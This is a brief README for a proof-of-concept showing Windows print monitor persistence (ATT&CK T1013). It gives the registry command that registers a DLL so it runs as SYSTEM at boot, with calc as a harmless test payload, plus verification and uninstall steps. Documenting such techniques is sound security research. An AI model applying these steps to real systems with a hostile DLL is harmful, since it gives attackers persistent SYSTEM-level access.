# Print Monitor

Print monitor persistence. 

[T1013](https://attack.mitre.org/wiki/Technique/T1013)

## Install
      
Copy the DLL to C:\Windows\System32\PrintMonitor.dll (or any name.dll in C:\Windows\System32\ is fine too)

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\Tmp2 /V Driver /t REG_SZ /d PrintMonitor.dll
```
 
(feel free to change Tmp2 to anything else if you want)

**Restart the system**
      
You should now see calc running as SYSTEM. To verify, open a cmd prompt as an administrator and run

```      
tasklist /v |findstr calc
```
 
## Uninstall
    
```
reg delete HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\Tmp2 /F
```

## Author

Josh Abraham (josh.abraham@praetorian.com)
